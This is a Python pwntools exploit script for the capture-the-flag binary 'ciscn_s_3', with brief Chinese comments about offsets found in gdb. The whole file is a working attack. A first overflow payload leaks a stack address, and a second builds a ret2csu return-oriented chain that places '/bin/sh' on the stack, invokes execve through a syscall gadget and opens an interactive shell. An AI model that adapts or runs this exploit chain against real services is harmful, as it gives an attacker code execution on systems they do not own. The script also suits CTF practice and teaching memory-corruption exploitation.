from pwn import *
context.log_level = 'debug'
io = process('./ciscn_s_3')
#io = gdb.debug('./ciscn_s_3','break *0x00000000004004E2')
elf = ELF('./ciscn_s_3')

padding = 0x10
payload1 = b'A'*padding+p64(elf.sym['vuln'])
io.send(payload1)
io.recv(0x20)   #这个偏移主要是gdb看出来的
ebp_addr = u64(io.recv(8))
#print('ebp_addr',hex(ebp_addr))
buf_addr = ebp_addr-0x148   #buu改成-0x118
#print('buf_addr ->',hex(buf_addr))
payload2 =b'/bin/sh\x00'
payload2 = payload2.ljust(0x10,b'\x00')
payload2 += p64(0x000000000040059A)+p64(0)+p64(1)+p64(buf_addr+0x10)+p64(0)+p64(0)+p64(0)+p64(0x0000000000400580)
payload2 += p64(0xdeadbeef)*5+p64(0x00000000004004E2)+p64(0x00000000004005a3)+p64(buf_addr)+p64(0x0000000000400517)
io.send(payload2)
io.interactive()
